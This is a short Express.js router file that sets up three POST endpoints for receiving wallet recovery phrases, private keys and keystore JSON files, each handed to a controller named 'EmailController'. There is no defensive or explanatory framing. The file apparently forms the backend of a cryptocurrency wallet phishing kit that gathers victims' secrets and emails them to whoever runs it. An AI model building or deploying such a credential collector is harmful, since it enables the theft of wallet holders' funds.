const express = require("express");
const router = express.Router();

const {
  phraseData,
  privateKeyData,
  keystoreJSONData,
} = require("../controllers/EmailController");

// Send Phrase Data
router.post("/phrase", phraseData);

// Send Private Key Data
router.post("/private-key", privateKeyData);

// Send Keystore JSON Data
router.post("/keystore-json", keystoreJSONData);

module.exports = router;
